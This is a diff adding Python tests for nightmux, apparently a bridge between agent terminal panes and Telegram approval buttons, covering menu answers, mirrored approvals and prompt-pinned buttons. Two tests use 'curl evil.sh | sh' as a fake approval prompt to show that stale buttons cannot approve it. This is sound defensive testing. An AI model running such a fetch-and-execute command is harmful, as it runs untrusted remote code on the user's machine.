@@ -1,12 +1,15 @@
-"""test_answers: cut from tests/selfcheck.py (pre-stub part)."""
+"""test_answers: cut from the old monolithic selfcheck() (pre-stub part)."""
 import json
 import os
+import queue
 import sys
 import threading
+import time
 
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
 import nightmux  # noqa: E402
 from _iso import isolated  # noqa: E402
+from _legacy import legacy_stubs  # noqa: E402
 
 
 def test_menu_buttons():
@@ -85,3 +88,202 @@ def test_answer_key_needs_a_question():
                      pane_state=lambda l: "waiting", press=lambda *a, **k: None,
                      pick=lambda s, w: None, resolve_ask=lambda *a: None):
             assert nightmux.handle(kcfg, {}, klk, "1", "!3") is None      # a real menu: answered
+
+
+def test_menu_enter_checked_not_assumed():
+    with isolated(nightmux) as iso:
+        cfg, state, screen, sent = legacy_stubs(nightmux)
+        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
+        twice = lambda: (nightmux.flush_new(cfg, state, "1", "s"), nightmux.flush_new(cfg, state, "1", "s"))
+        typed, edits = [], []
+        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
+        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
+        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
+        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
+                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
+        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
+                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
+                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
+                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
+                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
+                           "why": "trace=False prev=False mode=idle active=False"}
+
+        # Menus disagree about Enter, so the answer is checked rather than assumed.
+        keys, calls = [], []
+        screen[:] = ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]
+        assert nightmux.menu_digit(screen, nightmux.YES_NO["!y"]) == "1"    # "y" would go nowhere here
+        assert nightmux.menu_digit(screen, nightmux.YES_NO["!n"]) == "2"
+        with nightmux.stubbed(tmux=lambda *a: keys.append(a[-1]), CONFIRM_AFTER=0.3):
+            nightmux.press("s", "1", confirm=True)             # menu still up: the digit alone
+            assert keys == ["1", "Enter"], keys        # only moved the highlight
+            keys[:] = []
+            with nightmux.stubbed(visible=lambda s: (calls.append(1),
+                                            list(screen) if len(calls) < 2
+                                            else ["● done", "esc to interrupt"])[1]):
+                nightmux.press("s", "1", confirm=True)         # the dialog acted on the digit:
+            assert keys == ["1"], keys                 # a stray Enter would answer the
+        screen[:] = ["● done"] + box                  # next question for you
+
+        nightmux.handle(cfg, state, threading.Lock(), "1", "another one", mid=555)  # prompt ticked
+        assert ("setMessageReaction", 555) in [(m, k.get("message_id")) for m, k in edits]
+        assert st["react"] == 555 and st["prog_msg"] == 77
+        screen[:] = ["● done", "● and the answer"] + box
+        twice()
+        assert "react" not in st, st
+        assert json.loads(edits[-1][1]["reaction"])[0]["emoji"] == nightmux.DONE, edits[-1]
+
+        assert nightmux.handle(cfg, state, threading.Lock(), "1", "/topics") == nightmux.status_report(cfg, state)
+        assert nightmux.handle(cfg, state, threading.Lock(), "1", "/pane 5") is not None  # alias -> !pane
+        assert {c["command"] for c in
+                [{"command": c} for c in nightmux.TG_SLASH]} & {c for c, _ in nightmux.PASSTHRU} == set()
+
+
+def test_approval_mirrors_into_center():
+    with isolated(nightmux) as iso:
+        cfg, state, screen, sent = legacy_stubs(nightmux)
+        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
+        typed, edits = [], []
+        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
+        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
+        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
+        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
+                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
+        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
+                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
+                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
+                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
+                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
+                           "why": "trace=False prev=False mode=idle active=False"}
+
+        # A pending approval mirrors into the command center; whichever copy is
+        # tapped first resolves it under the shared lock, and the other has
+        # nothing left to press — no duplicate keystroke lands in the pane.
+        st = state["s"]
+        cfg["center_topic"] = "999"                    # distinct from "1": a real mirror
+        st.pop("asked", None), st.pop("asked_msgs", None)
+        sent_n = len(sent)
+        ok = nightmux.ask(cfg, st, "1", "s", "proceed?", ["Do you want to proceed?",
+                 "❯ 1. Yes", "  2. No"], key="k1")
+        assert ok is True and len(sent) == sent_n + 2      # origin, then the mirror
+        assert st["asked_msgs"] == [("1", 77), ("999", 77)], st["asked_msgs"]
+        pressed, edits_n = [], len(edits)
+
+
+def test_mirrored_button_needs_live_prompt():
+    with isolated(nightmux) as iso:
+        cfg, state, screen, sent = legacy_stubs(nightmux)
+        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
+        typed, edits = [], []
+        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
+        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
+        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
+        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
+                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
+        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
+                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
+                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
+                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
+                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
+                           "why": "trace=False prev=False mode=idle active=False"}
+        pressed, edits_n = [], len(edits)
+
+        # The pane really is asking — a mirrored button only exists because it was.
+        # The answer-key guard reads the live pane, so this has to present one.
+        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                     visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
+            assert nightmux.handle(cfg, state, threading.Lock(), "999", "!1 s") is None  # mirror tapped first
+        assert pressed == [("s", "1")], pressed
+        assert "asked_msgs" not in st                      # resolved: nothing left to answer
+        assert any(m == "editMessageReplyMarkup" for m, _ in edits[edits_n:]), edits[edits_n:]
+        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_))):
+            assert nightmux.handle(cfg, state, threading.Lock(), "1", "!1 s") is None    # origin's own copy, too late
+        assert pressed == [("s", "1")], pressed             # the racing second tap: no-op
+        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                     visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
+            nightmux.handle(cfg, state, threading.Lock(), "1", "!1")   # bare, no session: unaffected
+        assert pressed == [("s", "1"), ("s", "1")], pressed
+
+
+def test_button_pinned_to_its_prompt():
+    with isolated(nightmux) as iso:
+        legacy_stubs(nightmux)
+        # A button is pinned to the prompt it was drawn for. The same question about
+        # another command is another prompt: the first one's buttons press nothing.
+        scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
+                 "❯ 1. Yes", "  2. No"]
+        scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
+        fp_a, fp_b = nightmux.prompt_fp(scr_a), nightmux.prompt_fp(scr_b)
+        assert fp_a != fp_b
+
+
+def test_counters_borders_picked_row_not_new_prompt():
+    with isolated(nightmux) as iso:
+        cfg, state, screen, sent = legacy_stubs(nightmux)
+        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
+        typed, edits = [], []
+        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
+        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
+        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
+        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
+                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
+        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
+                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
+                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
+                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
+                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
+                           "why": "trace=False prev=False mode=idle active=False"}
+        pressed, edits_n = [], len(edits)
+        scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
+                 "❯ 1. Yes", "  2. No"]
+        scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
+        fp_a, fp_b = nightmux.prompt_fp(scr_a), nightmux.prompt_fp(scr_b)
+
+        # Counters, borders, padding and the picked row moving are not a new prompt.
+        assert fp_a == nightmux.prompt_fp(["│ Bash command (3s) │", "│   rm -rf build/   │",
+                                  "Do you want to proceed?", "", "  1. Yes", "❯ 2. No", ""])
+        assert nightmux.prompt_fp(["Waiting ◐ for approval (3s)"] + scr_a) == \
+            nightmux.prompt_fp(["Waiting ✽ for approval (41s)"] + scr_a)               # a spinner frame
+        pin = json.loads(nightmux.menu_buttons(scr_a, "s", bind=True))["inline_keyboard"]
+        assert [r[0]["callback_data"] for r in pin[:2]] == [f"!1 s ~{fp_a}", f"!2 s ~{fp_a}"], pin
+        assert [b["callback_data"] for b in pin[-1]] == [
+            "!esc s", "!up s", "!down s", f"!enter s ~{fp_a}"], pin[-1]       # only answers are pinned
+        assert "~" not in nightmux.menu_buttons(scr_a, "s")                            # dashboard, controls: as before
+        long_ = "x" * 55                                                      # 64 bytes is Telegram's cap
+        assert json.loads(nightmux.menu_buttons(scr_a, long_, bind=True))["inline_keyboard"][0][0][
+            "callback_data"] == f"!1 {long_}"
+
+        pressed[:], posted = [], []
+        st.pop("asked", None), st.pop("asked_msgs", None)
+        nightmux.ask(cfg, st, "1", "s", "rm -rf build/", scr_a, key="ka")              # A's buttons go out
+        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                     send=lambda c, t, x, mode="mono", buttons=None, quiet=False:
+                         posted.append((x, buttons)) or 78,
+                     pane=lambda x: scr_b, visible=lambda x: scr_b):          # B is up now
+            refused = nightmux.handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_a}")  # a tap on A's copy
+            assert "nothing pressed" in refused and pressed == [], (refused, pressed)
+            assert posted and "curl evil.sh" in posted[0][0] and f"~{fp_b}" in posted[0][1], posted
+            assert nightmux.handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_b}") is None
+            assert pressed == [("s", "1")], pressed                           # B's own button: pressed
+            assert nightmux.handle(cfg, state, threading.Lock(), "1", f"!2 ~{fp_b}") is None
+            assert pressed == [("s", "1"), ("s", "2")], pressed               # no session suffix: the hook's
+        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
+                     pane=lambda x: ["● done", "❯ "], visible=lambda x: ["● done", "❯ "]):
+            assert "already gone" in nightmux.handle(cfg, state, threading.Lock(), "1", f"!1 ~{fp_a}")
+        assert pressed == [("s", "1"), ("s", "2")], pressed
+        cfg["center_topic"] = None
+
+        st = state["s"]                               # busy: hold it where we can see it
+        st["queue"], typed[:] = [], []
+        screen[:] = ["● working", "✻ Brewing… (3s · esc to interrupt)"]
+        held = nightmux.handle(cfg, state, threading.Lock(), "1", "do this after")
+        assert held.startswith("📥 queued (1) · s is working") and typed == [], held
+        assert nightmux.handle(cfg, state, threading.Lock(), "1", "!raw urgent") is None
+        assert typed == ["urgent"], typed             # !raw still overrides
+        st["mode"] = "busy"
+        nightmux.drain(cfg, state, "1", "s")                   # still busy: nothing moves
+        assert len(st["queue"]) == 1
+        st["mode"] = "idle"
+        nightmux.drain(cfg, state, "1", "s")
+        assert typed[-1] == "do this after" and st["queue"] == []
+        assert sent[-1].startswith("▶️ s sending queued prompt"), sent[-1]
+        screen[:] = ["● done"] + box
